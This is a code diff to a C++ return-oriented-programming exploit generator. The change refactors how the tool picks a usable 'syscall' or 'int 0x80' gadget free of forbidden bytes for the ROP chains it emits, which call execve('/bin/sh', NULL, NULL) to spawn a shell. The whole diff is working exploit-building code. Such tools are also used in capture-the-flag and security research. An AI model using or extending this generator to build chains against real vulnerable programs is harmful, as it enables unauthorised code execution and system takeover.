@@ -273,6 +273,21 @@ void ROP::PayloadGenX86::computeRelevantSequenceIndexes() {
             break;
         }
     }
+
+    std::string syscallInstruction;
+    syscallInstruction = (this->processArchSize == BitSizeClass::BIT64) ? "syscall" : "int 0x80";
+
+    // Compute `this->indexValidSyscallInstrSeq` member.
+    this->indexValidSyscallInstrSeq = this->instrSeqs.size();
+    for (unsigned sequenceIndex : this->firstInstrToSequenceIndexes[syscallInstruction]) {
+        addressType sequenceAddress = this->instrSeqs[sequenceIndex].first;
+
+        if (this->registerSizedValueIsFreeOfForbiddenBytes(sequenceAddress)) {
+            // Found a valid index.
+            this->indexValidSyscallInstrSeq = sequenceIndex;
+            break;
+        }
+    }
 }
 
 void ROP::PayloadGenX86::addPythonScriptPrelude() {
@@ -859,6 +874,21 @@ ROP::PayloadGenX86::appendGadgetStartingWithInstruction(const std::vector<std::s
     return true;
 }
 
+bool ROP::PayloadGenX86::appendGadgetForFinalSystemCall() {
+    if (this->indexValidSyscallInstrSeq == this->instrSeqs.size()) {
+        return false;
+    }
+
+    this->addLineToPythonScript("# Make the system call");
+    this->addLineToPythonScript("if True:");
+    this->currLineIndent++;
+    this->appendInstructionSequenceToPayload(this->indexValidSyscallInstrSeq);
+    this->currLineIndent--;
+    this->addLineToPythonScript(""); // New line
+
+    return true;
+}
+
 
 bool ROP::PayloadGenX86::appendGadgetForCopyOrExchangeRegisters(x86_reg destRegKey,
                                                                 x86_reg srcRegKey,
@@ -1038,6 +1068,10 @@ bool ROP::PayloadGenX86::appendROPChainForShellCodeWithPathNullNull() {
     addressType binShAddress = this->findValidVirtualMemoryAddressOfString("/bin/sh");
     assertMessage(binShAddress != 0, "Can't make this work without a \"/bin/sh\" address in virtual memory...");
 
+    assertMessage(this->indexValidSyscallInstrSeq != this->instrSeqs.size(),
+                  "We need a virtual memory address for a syscall instruction but no valid address found... "
+                  "Either no syscall instruction found at all or they all have forbidden bytes.");
+
     return this->tryAppendOperationsAndRevertOnFailure([&] {
         // Explain in the script what we are doing.
         this->addLineToPythonScript("# ROP-chain for calling: execve(\"/bin/sh\", NULL, NULL);");
@@ -1102,13 +1136,7 @@ bool ROP::PayloadGenX86::appendROPChainForShellCodeWithPathNullNull() {
                 }
 
                 // Make the system call.
-                this->addLineToPythonScript("# Make the system call");
-                if (this->processArchSize == BitSizeClass::BIT64) {
-                    ok = ok && this->appendGadgetStartingWithInstruction({"syscall"}, {}, [&](const std::string&) {});
-                }
-                else {
-                    ok = ok && this->appendGadgetStartingWithInstruction({"int 0x80"}, {}, [&](const std::string&) {});
-                }
+                ok = ok && this->appendGadgetForFinalSystemCall();
 
                 return ok;
             });
@@ -1130,6 +1158,10 @@ bool ROP::PayloadGenX86::appendROPChainForShellCodeWithPathEmptyEmpty() {
     byteSequence nullPtrBytes = byteSequence(this->registerByteSize, 0x00);
     addressType nullAddress = this->findValidVirtualMemoryAddressOfBytes(nullPtrBytes);
     assertMessage(nullAddress != 0, "Can't find a NULL pointer value in virtual memory...");
+
+    assertMessage(this->indexValidSyscallInstrSeq != this->instrSeqs.size(),
+                  "We need a virtual memory address for a syscall instruction but no valid address found... "
+                  "Either no syscall instruction found at all or they all have forbidden bytes.");
 
     return this->tryAppendOperationsAndRevertOnFailure([&] {
         // Explain in the script what we are doing.
@@ -1196,13 +1228,7 @@ bool ROP::PayloadGenX86::appendROPChainForShellCodeWithPathEmptyEmpty() {
                 }
 
                 // Make the system call.
-                this->addLineToPythonScript("# Make the system call");
-                if (this->processArchSize == BitSizeClass::BIT64) {
-                    ok = ok && this->appendGadgetStartingWithInstruction({"syscall"}, {}, [&](const std::string&) {});
-                }
-                else {
-                    ok = ok && this->appendGadgetStartingWithInstruction({"int 0x80"}, {}, [&](const std::string&) {});
-                }
+                ok = ok && this->appendGadgetForFinalSystemCall();
 
                 return ok;
             });
